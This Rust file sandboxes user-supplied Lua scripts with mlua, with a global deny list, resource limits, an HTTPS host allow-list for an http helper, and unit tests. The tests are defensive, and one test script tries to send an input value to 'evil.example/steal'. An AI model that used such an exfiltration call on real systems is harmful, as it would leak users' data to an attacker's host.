use std::cell::Cell;
use std::rc::Rc;
use std::sync::Arc;
use std::time::{Duration, Instant};

use mlua::{HookTriggers, Lua, LuaOptions, LuaSerdeExt, StdLib, Table, Value, VmState};
use serde::de::DeserializeOwned;

use crate::fetch::{Fetch, Request};
use crate::guard::{Denied, Guard};

const HOOK_EVERY: u32 = 50_000;
const UNSAFE_GLOBALS: [&str; 15] = [
    "load",
    "loadstring",
    "loadfile",
    "dofile",
    "require",
    "collectgarbage",
    "getmetatable",
    "setmetatable",
    "rawget",
    "rawset",
    "rawequal",
    "rawlen",
    "newproxy",
    "_G",
    "package",
];

#[derive(Clone, Copy)]
pub struct Limits {
    pub max_calls: u32,
    pub max_time: Duration,
    pub max_memory: usize,
}

impl Default for Limits {
    fn default() -> Self {
        Self {
            max_calls: 24,
            max_time: Duration::from_secs(45),
            max_memory: 32 * 1024 * 1024,
        }
    }
}

#[derive(Debug, PartialEq, Eq, thiserror::Error)]
pub enum RunError {
    #[error("denied: {}", .0.code())]
    Denied(Denied),
    #[error("script: {0}")]
    Script(String),
    #[error("sandbox: {0}")]
    Sandbox(String),
}

impl RunError {
    pub fn code(&self) -> &'static str {
        match self {
            RunError::Denied(denied) => denied.code(),
            RunError::Script(_) => "script",
            RunError::Sandbox(_) => "sandbox",
        }
    }
}

pub struct Job<'a> {
    pub script: &'a str,
    pub inputs: &'a [(&'a str, &'a str)],
    pub hosts: &'a [String],
    pub fetch: Arc<dyn Fetch>,
    pub limits: Limits,
}

pub fn run<T: DeserializeOwned>(job: Job<'_>) -> Result<T, RunError> {
    let deadline = Instant::now() + job.limits.max_time;
    let denied = Rc::new(Cell::new(None));
    let lua = vm(job.limits.max_memory, deadline).map_err(sandbox)?;
    register(&lua, &job, deadline, &denied).map_err(sandbox)?;
    set_inputs(&lua, job.inputs).map_err(sandbox)?;
    let ran = lua
        .load(job.script)
        .set_name("boosty-bundle")
        .eval::<Value>()
        .and_then(|value| lua.from_value::<T>(value));
    scrub(&lua);
    match (denied.get(), ran) {
        (Some(reason), _) => Err(RunError::Denied(reason)),
        (None, Ok(value)) => Ok(value),
        (None, Err(error)) => Err(RunError::Script(first_line(&error.to_string()))),
    }
}

fn vm(max_memory: usize, deadline: Instant) -> mlua::Result<Lua> {
    let lua = Lua::new_with(
        StdLib::STRING | StdLib::TABLE | StdLib::MATH,
        LuaOptions::default(),
    )?;
    lua.set_memory_limit(max_memory)?;
    for name in UNSAFE_GLOBALS {
        lua.globals().set(name, Value::Nil)?;
    }
    lua.set_hook(
        HookTriggers::new().every_nth_instruction(HOOK_EVERY),
        move |_, _| match Instant::now() >= deadline {
            true => Err(mlua::Error::RuntimeError("deadline".into())),
            false => Ok(VmState::Continue),
        },
    );
    Ok(lua)
}

fn register(
    lua: &Lua,
    job: &Job<'_>,
    deadline: Instant,
    denied: &Rc<Cell<Option<Denied>>>,
) -> mlua::Result<()> {
    let globals = lua.globals();
    globals.set("log", lua.create_function(|_, _: mlua::MultiValue| Ok(()))?)?;
    globals.set("json_encode", lua.create_function(json_encode)?)?;
    globals.set("json_decode", lua.create_function(json_decode)?)?;
    globals.set("urlencode", lua.create_function(urlencode)?)?;
    globals.set("b64encode", lua.create_function(b64encode)?)?;

    let guard = Guard::new(job.hosts, job.limits.max_calls);
    let fetch = job.fetch.clone();
    let denied = denied.clone();
    let http = lua.create_function(move |lua, table: Table| {
        if Instant::now() >= deadline {
            return Err(mlua::Error::RuntimeError("deadline".into()));
        }
        let request = read_request(&table)?;
        if let Err(reason) = guard.check(&request) {
            denied.set(Some(reason));
            return Err(mlua::Error::RuntimeError(reason.code().into()));
        }
        let response = fetch.call(request);
        let reply = lua.create_table()?;
        reply.set("status", response.status)?;
        reply.set("body", lua.create_string(&response.body)?)?;
        reply.set("headers", lua.create_table()?)?;
        if let Some(error) = response.error {
            reply.set("error", error)?;
        }
        Ok(reply)
    })?;
    globals.set("http", http)
}

fn read_request(table: &Table) -> mlua::Result<Request> {
    let mut headers = Vec::new();
    if let Some(given) = table.get::<Option<Table>>("headers")? {
        for pair in given.pairs::<String, String>() {
            headers.push(pair?);
        }
    }
    Ok(Request {
        url: table.get("url")?,
        method: table
            .get::<Option<String>>("method")?
            .unwrap_or_else(|| "GET".into()),
        headers,
        body: table
            .get::<Option<mlua::String>>("body")?
            .map(|body| body.as_bytes().to_vec())
            .unwrap_or_default(),
    })
}

fn set_inputs(lua: &Lua, inputs: &[(&str, &str)]) -> mlua::Result<()> {
    let table = lua.create_table()?;
    for (name, value) in inputs {
        table.set(*name, lua.create_string(value)?)?;
    }
    lua.globals().set("inputs", table)
}

fn scrub(lua: &Lua) {
    let _ = lua.globals().set("inputs", Value::Nil);
    let _ = lua.gc_collect();
    let _ = lua.gc_collect();
}

fn json_encode(lua: &Lua, value: Value) -> mlua::Result<mlua::String> {
    let json: serde_json::Value = lua.from_value(value)?;
    let bytes = serde_json::to_vec(&json)
        .map_err(|e| mlua::Error::RuntimeError(format!("json_encode: {e}")))?;
    lua.create_string(bytes)
}

fn json_decode(lua: &Lua, text: mlua::String) -> mlua::Result<Value> {
    let json: serde_json::Value = serde_json::from_slice(&text.as_bytes())
        .map_err(|e| mlua::Error::RuntimeError(format!("json_decode: {e}")))?;
    lua.to_value(&json)
}

fn urlencode(lua: &Lua, text: mlua::String) -> mlua::Result<mlua::String> {
    const HEX: &[u8; 16] = b"0123456789ABCDEF";
    let mut out = String::new();
    for &byte in text.as_bytes().iter() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char)
            }
            _ => {
                out.push('%');
                out.push(HEX[(byte >> 4) as usize] as char);
                out.push(HEX[(byte & 0x0f) as usize] as char);
            }
        }
    }
    lua.create_string(out)
}

fn b64encode(lua: &Lua, text: mlua::String) -> mlua::Result<mlua::String> {
    use base64::Engine;
    lua.create_string(base64::engine::general_purpose::STANDARD.encode(text.as_bytes()))
}

fn first_line(text: &str) -> String {
    text.lines()
        .next()
        .unwrap_or("")
        .chars()
        .take(160)
        .collect()
}

fn sandbox(error: mlua::Error) -> RunError {
    RunError::Sandbox(first_line(&error.to_string()))
}

#[cfg(test)]
mod tests {
    use std::sync::Mutex;

    use serde_json::{Value as Json, json};

    use super::*;
    use crate::fetch::Response;

    struct Canned {
        seen: Mutex<Vec<Request>>,
        status: u16,
        body: &'static str,
    }

    impl Canned {
        fn new(status: u16, body: &'static str) -> Arc<Self> {
            Arc::new(Self {
                seen: Mutex::new(vec![]),
                status,
                body,
            })
        }
    }

    impl Fetch for Canned {
        fn call(&self, request: Request) -> Response {
            self.seen.lock().unwrap().push(request);
            Response {
                status: self.status,
                body: self.body.as_bytes().to_vec(),
                error: None,
            }
        }
    }

    fn exec(script: &str, fetch: Arc<dyn Fetch>, limits: Limits) -> Result<Json, RunError> {
        let hosts = vec!["pay.example".to_string()];
        run(Job {
            script,
            inputs: &[("action", "bind"), ("number", "hello")],
            hosts: &hosts,
            fetch,
            limits,
        })
    }

    fn plain(script: &str) -> Result<Json, RunError> {
        exec(script, Canned::new(200, "{}"), Limits::default())
    }

    #[test]
    fn inputs_arrive_as_a_table_of_strings() {
        assert_eq!(
            plain("return { a = inputs.action, n = inputs.number }").unwrap(),
            json!({"a": "bind", "n": "hello"})
        );
    }

    #[test]
    fn the_sandbox_has_no_os_io_or_loaders() {
        for script in [
            "return os.time()",
            "return io.open('x')",
            "return require('os')",
            "return dofile('x')",
            "return load('return 1')()",
            "return debug.getinfo(1)",
        ] {
            assert!(plain(script).is_err(), "{script}");
        }
        let kept = plain(
            "return { s = type('x'), t = tostring(1), m = math.floor(1.5), u = string.upper('a') }",
        );
        assert_eq!(
            kept.unwrap(),
            json!({"s": "string", "t": "1", "m": 1, "u": "A"})
        );
    }

    #[test]
    fn json_helpers_round_trip() {
        let got = plain(r#"return json_decode(json_encode({ x = 1, y = { "a", "b" } }))"#).unwrap();
        assert_eq!(got, json!({"x": 1, "y": ["a", "b"]}));
        assert!(plain(r#"return json_decode("{broken")"#).is_err());
    }

    #[test]
    fn urlencode_and_base64_match_the_relay_helpers() {
        let got = plain(r#"return { u = urlencode("a b&c=d#e/f"), b = b64encode("hi") }"#).unwrap();
        assert_eq!(got, json!({"u": "a%20b%26c%3Dd%23e%2Ff", "b": "aGk="}));
    }

    #[test]
    fn log_is_accepted_and_goes_nowhere() {
        assert_eq!(
            plain(r#"log("info", inputs.number) return 1"#).unwrap(),
            json!(1)
        );
    }

    #[test]
    fn http_reaches_the_fetcher_for_a_listed_host() {
        let fetch = Canned::new(200, r#"{"ok":true}"#);
        let script = r#"
            local r = http({ url = "https://pay.example/x", method = "POST", headers = { ["X-A"] = "1" }, body = "payload" })
            return { status = r.status, body = r.body }
        "#;
        let got = exec(script, fetch.clone(), Limits::default()).unwrap();
        assert_eq!(got, json!({"status": 200, "body": "{\"ok\":true}"}));
        let seen = fetch.seen.lock().unwrap();
        assert_eq!(seen[0].url, "https://pay.example/x");
        assert_eq!(seen[0].method, "POST");
        assert_eq!(seen[0].body, b"payload");
        assert_eq!(seen[0].headers, vec![("X-A".to_string(), "1".to_string())]);
    }

    #[test]
    fn a_foreign_host_aborts_the_script_before_any_request() {
        let fetch = Canned::new(200, "{}");
        let script = r#"return http({ url = "https://evil.example/steal?c=" .. inputs.number })"#;
        let got = exec(script, fetch.clone(), Limits::default());
        assert_eq!(got, Err(RunError::Denied(Denied::ForeignHost)));
        assert!(fetch.seen.lock().unwrap().is_empty());
    }

    #[test]
    fn a_script_cannot_hide_a_denial_by_catching_it() {
        let fetch = Canned::new(200, "{}");
        let script = r#"
            pcall(http, { url = "http://pay.example/" })
            return { ok = true }
        "#;
        let got = exec(script, fetch.clone(), Limits::default());
        assert_eq!(got, Err(RunError::Denied(Denied::NotHttps)));
        assert!(fetch.seen.lock().unwrap().is_empty());
    }

    #[test]
    fn the_request_cap_stops_a_runaway_loop() {
        let fetch = Canned::new(200, "{}");
        let limits = Limits {
            max_calls: 3,
            ..Limits::default()
        };
        let got = exec(
            r#"for i = 1, 100 do http({ url = "https://pay.example/" }) end return 1"#,
            fetch.clone(),
            limits,
        );
        assert_eq!(got, Err(RunError::Denied(Denied::TooManyCalls)));
        assert_eq!(fetch.seen.lock().unwrap().len(), 3);
    }

    #[test]
    fn an_endless_loop_is_cut_by_the_deadline() {
        let limits = Limits {
            max_time: Duration::from_millis(150),
            ..Limits::default()
        };
        let started = Instant::now();
        let got = exec("while true do end", Canned::new(200, "{}"), limits);
        assert!(matches!(got, Err(RunError::Script(_))));
        assert!(started.elapsed() < Duration::from_secs(5));
    }

    #[test]
    fn a_memory_bomb_is_capped() {
        let got = plain(r#"local s = string.rep("a", 1000000000000) return #s"#);
        assert!(matches!(got, Err(RunError::Script(_))));
    }

    #[test]
    fn a_script_error_comes_back_as_one_short_line() {
        match plain("error('boom\\nsecond line')") {
            Err(RunError::Script(text)) => {
                assert!(text.contains("boom") && !text.contains("second"))
            }
            other => panic!("{other:?}"),
        }
    }
}
